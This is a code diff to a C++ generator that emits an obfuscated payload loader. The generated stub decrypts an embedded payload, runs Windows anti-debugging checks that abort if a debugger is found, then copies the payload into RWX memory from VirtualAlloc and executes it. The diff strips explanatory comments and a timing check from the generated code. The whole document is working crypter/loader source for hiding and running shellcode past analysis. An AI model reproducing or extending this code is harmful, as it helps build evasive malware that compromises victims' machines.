@@ -88,26 +88,20 @@ public:
         decryptionLoop.condition = loopVar + " < " + encryptedData + ".size()";
         decryptionLoop.nestingLevel = 1;
         
-        ss << "    // Branched decryption with multiple obfuscation layers\n";
         ss << "    std::vector<uint8_t> " << outputVar << "(" << encryptedData << ".size());\n\n";
         
-        // Generate validation branches
         auto validationPlugin = getAppropriateBranchPlugin(keyValidation);
         if (validationPlugin) {
-            ss << "    // Key validation using " << validationPlugin->getName() << " style\n";
             ss << validationPlugin->generateBranch(keyValidation) << "\n\n";
         }
         
         auto dataValidationPlugin = getAppropriateBranchPlugin(dataValidation);
         if (dataValidationPlugin) {
-            ss << "    // Data validation using " << dataValidationPlugin->getName() << " style\n";
             ss << dataValidationPlugin->generateBranch(dataValidation) << "\n\n";
         }
         
-        // Generate decryption loop with branching
         auto loopPlugin = getAppropriateBranchPlugin(decryptionLoop);
         if (loopPlugin) {
-            ss << "    // Decryption loop using " << loopPlugin->getName() << " style\n";
             ss << loopPlugin->generateBranch(decryptionLoop) << "\n\n";
         }
         
@@ -122,8 +116,7 @@ public:
         std::vector<std::string> debugChecks = {
             "IsDebuggerPresent()",
             "CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent) && debuggerPresent",
-            "GetTickCount64() - startTime > 100",  // Timing check
-            "NtQueryInformationProcess != nullptr"  // API check
+            "NtQueryInformationProcess != nullptr"
         };
         
         std::vector<std::string> responses = {
@@ -133,22 +126,19 @@ public:
             "abort();"
         };
         
-        ss << "    // Anti-debugging checks with branched obfuscation\n";
         ss << "    BOOL debuggerPresent = FALSE;\n";
-        ss << "    uint64_t startTime = GetTickCount64();\n";
         ss << "    auto NtQueryInformationProcess = GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtQueryInformationProcess\");\n\n";
         
         for (size_t i = 0; i < debugChecks.size(); ++i) {
             auto antiDebugContext = BranchUtils::createSimpleConditional(
                 debugChecks[i],
                 responses[i % responses.size()],
-                "/* continue execution */"
+                ""
             );
             antiDebugContext.nestingLevel = 1;
             
             auto plugin = getAppropriateBranchPlugin(antiDebugContext);
             if (plugin) {
-                ss << "    // Anti-debug check " << (i + 1) << " using " << plugin->getName() << " style\n";
                 ss << plugin->generateBranch(antiDebugContext) << "\n\n";
             }
         }
@@ -168,10 +158,8 @@ public:
             "VirtualAlloc != nullptr"
         };
         
-        ss << "    // Branched payload execution\n";
         ss << "    LPVOID execMem = VirtualAlloc(nullptr, " << payloadVar << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
         
-        // Generate nested execution checks
         for (size_t i = 0; i < executionConditions.size(); ++i) {
             std::string action;
             if (i == executionConditions.size() - 1) {
@@ -179,7 +167,7 @@ public:
                         "FlushInstructionCache(GetCurrentProcess(), execMem, " + payloadVar + ".size()); "
                         "((void(*)())execMem)();";
             } else {
-                action = "/* validation passed */";
+                action = "";
             }
             
             auto execContext = BranchUtils::createSimpleConditional(
@@ -191,7 +179,6 @@ public:
             
             auto plugin = getAppropriateBranchPlugin(execContext);
             if (plugin) {
-                ss << "    // Execution check " << (i + 1) << " using " << plugin->getName() << " style\n";
                 ss << plugin->generateBranch(execContext) << "\n\n";
             }
         }
@@ -220,8 +207,6 @@ public:
         ss << "#include <array>\n";
         ss << "#include <stdexcept>\n\n";
         
-        // Generate obfuscated encrypted data
-        ss << "// Encrypted payload data\n";
         ss << "static const std::vector<uint8_t> " << encDataVar << " = {\n    ";
         for (size_t i = 0; i < payload.size(); ++i) {
             if (i > 0 && i % 16 == 0) ss << "\n    ";
@@ -230,8 +215,6 @@ public:
         }
         ss << "\n};\n\n";
         
-        // Generate obfuscated key
-        ss << "// Decryption key\n";
         ss << "static const std::string " << keyVar << " = \"" << key << "\";\n\n";
         
         // Main function with branched logic
